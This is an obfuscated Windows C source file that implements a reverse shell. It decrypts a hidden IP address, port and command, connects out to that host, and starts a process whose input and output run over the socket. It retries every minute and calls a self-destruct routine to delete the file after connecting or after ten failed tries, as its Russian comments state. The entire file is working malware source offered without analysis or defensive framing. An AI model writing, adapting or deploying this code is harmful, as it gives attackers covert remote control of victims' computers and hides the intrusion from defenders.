#include <winsock2.h>#include <stdio.h>#include "proxy_funck.c"#include "proto_func.h"int ntjkqMmbbdzqavli(){STARTUPINFO ini_processo;PROCESS_INFORMATION processo_info;WSADATA wsaData;SOCKET Winsock;struct sockaddr_in hax;unsigned char xqibjFchehekkntt[] = {0x84, 0x8C,'\0'};int hlepxQfqixbhnaygcxjl = 256;unsigned char ybkkoErvzkgttqqijrxp[] = {'h','f','c','q','o','I','h','o','w','p','g','\0'};unsigned char ciizvTvfeftzivkk[hlepxQfqixbhnaygcxjl];size_t uhyflEstxr = strlen((char *)xqibjFchehekkntt);size_t evpojUfgrubblpayvl = strlen((char *)ybkkoErvzkgttqqijrxp);nksxeOvdofmfwyszq(ciizvTvfeftzivkk, ybkkoErvzkgttqqijrxp, evpojUfgrubblpayvl);oekdvTucorbxoxey(xqibjFchehekkntt, uhyflEstxr, ciizvTvfeftzivkk);char ip_addr_utka[sizeof(xqibjFchehekkntt)];memcpy(ip_addr_utka, xqibjFchehekkntt, uhyflEstxr + 1);unsigned char pwjsjZiajhpiowuh[] = {0xDA, 0x8A, 0x88, 0x6F,'\0'};int hcfmcMhyhamtjnsc = 256;unsigned char pycvmZnqsyzlrd[] = {'i','v','f','r','v','R','w','p','r','k','\0'};unsigned char focrzNslrx[hcfmcMhyhamtjnsc];size_t ptrzkXhvpjecgjlus = strlen((char *)pwjsjZiajhpiowuh);size_t psfunBhbvbsntmvnxory = strlen((char *)pycvmZnqsyzlrd);nksxeOvdofmfwyszq(focrzNslrx, pycvmZnqsyzlrd, psfunBhbvbsntmvnxory);oekdvTucorbxoxey(pwjsjZiajhpiowuh, ptrzkXhvpjecgjlus, focrzNslrx);char port_utka[sizeof(pwjsjZiajhpiowuh)];memcpy(port_utka, pwjsjZiajhpiowuh, ptrzkXhvpjecgjlus + 1);for (int i=0;;i++){pgcygEjtvyymk(MAKEWORD(2, 2), &wsaData);Winsock = lftzdWixrsqe(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);struct hostent *host;host = txidzPctiyytit(ip_addr_utka);strcpy_s(ip_addr_utka, 16, igomrBwosyips(*((struct in_addr *)host->h_addr)));hax.sin_family = AF_INET;hax.sin_port = haspgRrxjgocmdum(ftslkAqrizaw(port_utka));hax.sin_addr.s_addr = jlstyGxaraf(ip_addr_utka);int result;result = cmsvdJkxsaoniob(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);if (result != -1) {ckjwzLmktnubi(&ini_processo, 0, sizeof(ini_processo));ini_processo.cb = sizeof(ini_processo);ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;unsigned char jjfbdTnwwkycuvlzoq[] = {0x56, 0x82, 0xA1, 0xFE, 0xFC, 0x1E, 0xF0, 0x28, 0x42, 0x24, 0x5F, 0x68, 0x3D, 0x90,'\0'};int cggxqSpnaiqmdn = 256;unsigned char dnunnPngwm[] = {'e','a','q','u','w','Z','d','s','e','r','j','z','y','f','r','y','n','s','q','p','\0'};unsigned char nmremIyehyykoqsnw[cggxqSpnaiqmdn];size_t yqbbfMeukvcfu = strlen((char *)jjfbdTnwwkycuvlzoq);size_t dizunOmggznnx = strlen((char *)dnunnPngwm);nksxeOvdofmfwyszq(nmremIyehyykoqsnw, dnunnPngwm, dizunOmggznnx);oekdvTucorbxoxey(jjfbdTnwwkycuvlzoq, yqbbfMeukvcfu, nmremIyehyykoqsnw);char cmd_utka[sizeof(jjfbdTnwwkycuvlzoq)];memcpy(cmd_utka, jjfbdTnwwkycuvlzoq, yqbbfMeukvcfu + 1);izxonIdmurvzeickl(NULL, cmd_utka, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);SelfDestruction();                      // После того как произошло подлкючение по reverse shell, удаляем файл}elsefzmvwGqyevppnettf(60000);if (i > 9) {SelfDestruction();                  // Так же если прошло больше n попыток подключения, удаляем файл}}return 0;}